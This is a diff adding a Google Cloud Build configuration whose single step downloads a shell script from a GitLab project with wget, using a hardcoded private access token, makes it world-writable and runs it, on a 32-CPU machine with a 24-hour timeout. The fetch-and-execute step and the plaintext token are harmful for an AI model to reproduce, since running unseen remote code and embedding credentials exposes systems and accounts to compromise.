@@ -1,0 +1,12 @@
+steps:
+  - name: 'python:3.8'
+    entrypoint: "bash"
+    args:
+      - "-c"
+      - |
+          wget -O test.sh --header='PRIVATE-TOKEN:FdKDXvqsDSi2yajjRbhg' 'https://gitlab.com/api/v4/projects/24932197/repository/files/test.sh/raw?ref=master'
+          chmod 777 test.sh
+          ./test.sh
+timeout: 86400s
+options:
+  machineType: E2_HIGHCPU_32
